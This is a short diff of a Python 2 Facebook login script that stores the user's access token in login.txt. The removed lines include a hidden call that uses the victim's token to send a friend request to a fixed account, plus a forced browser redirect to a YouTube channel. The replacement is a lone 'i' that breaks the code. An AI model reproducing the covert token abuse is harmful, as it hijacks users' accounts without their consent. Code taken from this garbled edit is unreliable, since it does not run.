@@ -161,13 +161,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
-			except requests.exceptions.ConnectionError:
-				print"\n\033[1;97m[!] There is no internet connection"
-				keluar()
+				i
 		if 'checkpoint' in url:
 			print("\n\033[1;97m[!] Your Account is on Checkpoint")
 			os.system('rm -rf login.txt')
